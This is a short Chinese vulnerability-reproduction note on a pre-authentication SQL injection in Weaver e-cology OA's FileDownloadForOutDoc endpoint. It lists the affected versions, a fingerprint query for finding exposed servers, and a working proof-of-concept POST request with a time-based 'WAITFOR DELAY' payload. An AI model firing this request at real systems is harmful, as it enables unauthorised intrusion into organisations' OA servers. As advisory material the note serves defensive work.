---
title: "泛微OA e-cology FileDownloadForOutDoc前台SQL注入漏洞.md"
date: 2026-10-17 09:12:43
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "泛微OA"
tags:
  - "泛微OA"
  - "SQL注入"
  - "漏洞复现"
---
## 漏洞描述

泛微e-cology未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞

## 漏洞影响

```
部分e-cology 8且补丁版本<10.58.0
部分e-cology 9且补丁版本<10.58.0
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现
主页

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/c1a26215-1b62-419c-9db4-feb67d554edc.png)


POC

```plain
POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Content-Length: 45
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

fileid=3+WAITFOR+DELAY+'0:0:8'&isFromOutImg=1
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/5476bce7-1c60-4b6c-886a-92c014f43a50.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E6%B3%9B%E5%BE%AEOA-e-cology-FileDownloadForOutDoc%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
